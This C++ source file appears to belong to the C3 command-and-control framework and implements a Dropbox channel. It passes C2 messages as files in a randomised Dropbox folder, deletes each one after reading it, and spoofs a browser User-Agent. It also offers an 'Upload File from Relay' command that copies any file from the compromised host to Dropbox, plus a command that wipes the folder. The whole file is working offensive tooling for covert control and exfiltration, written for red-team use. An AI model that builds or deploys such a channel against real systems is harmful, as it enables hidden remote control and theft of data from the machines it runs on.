#include "Stdafx.h"
#include "Dropbox.h"
#include "Common/FSecure/Crypto/Base64.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Dropbox::Dropbox(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [userAgent, DropboxToken, channelName] = arguments.Read<std::string, std::string, std::string>();
	m_dropboxObj = FSecure::Dropbox{ userAgent, DropboxToken, channelName };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Dropbox::OnSendToChannel(ByteView data)
{
	// There is a cap on uploads of files >150mb at which point different APIs are required.
    data = data.SubString(0, 150 * 1024 * 1024);
	m_dropboxObj.WriteMessageToFile(m_outboundDirectionName, data);
	return data.size();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Dropbox::OnReceiveFromChannel()
{
	std::vector<ByteVector> ret;
	for (auto& [ts, id] : m_dropboxObj.GetMessagesByDirection(m_inboundDirectionName))
	{
		ret.push_back(m_dropboxObj.ReadFile(id));
		m_dropboxObj.DeleteFile(id);
	}

	return ret;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Dropbox::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		UploadFile(command);
		return {};
	case 1:
		DeleteAllFiles();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

void FSecure::C3::Interfaces::Channels::Dropbox::UploadFile(ByteView args)
{
	m_dropboxObj.UploadFile(args.Read<std::string>());
}


void FSecure::C3::Interfaces::Channels::Dropbox::DeleteAllFiles()
{
	m_dropboxObj.DeleteAllFiles();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Dropbox::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "User-Agent Header",
				"min": 1,
				"defaultValue": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
				"description": "The User-Agent header to set"
			},
			{
				"type": "string",
				"name": "Dropbox token",
				"min": 1,
				"description": "This token is what channel needs to interact with Dropbox's API"
			},
			{
				"type": "string",
				"name": "Folder name",
				"min": 4,
				"randomize": true,
				"description": "Folder to create for channel"
			}
		]
	},
	"commands":
	[
		{
			"name": "Upload File from Relay",
			"id": 0,
			"description": "Upload file from host running Relay directly to Dropbox (150mb max.)",
			"arguments":
			[
				{
                    "type" : "string",
					"name": "Remote Filepath",
					"description" : "Path to upload."
				}
			]
		},
		{
			"name": "Remove All Files",
			"id": 1,
			"description": "Delete channel folder and all files within it.",
			"arguments": []
		}
	]
}
)_";
}
